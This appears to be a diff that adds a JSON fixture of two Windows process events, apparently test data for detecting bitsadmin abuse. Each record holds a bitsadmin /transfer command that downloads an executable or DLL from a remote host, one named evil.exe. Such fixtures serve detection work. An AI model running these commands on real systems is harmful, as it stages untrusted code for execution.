@@ -1,0 +1,10 @@
+[
+  {
+    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+    "CommandLine": "bitsadmin /transfer job http://185.199.0.1/evil.exe C:\\Users\\Public\\evil.exe"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+    "CommandLine": "bitsadmin.exe /transfer myjob /download /priority high https://host/a.dll C:\\Temp\\a.dll"
+  }
+]
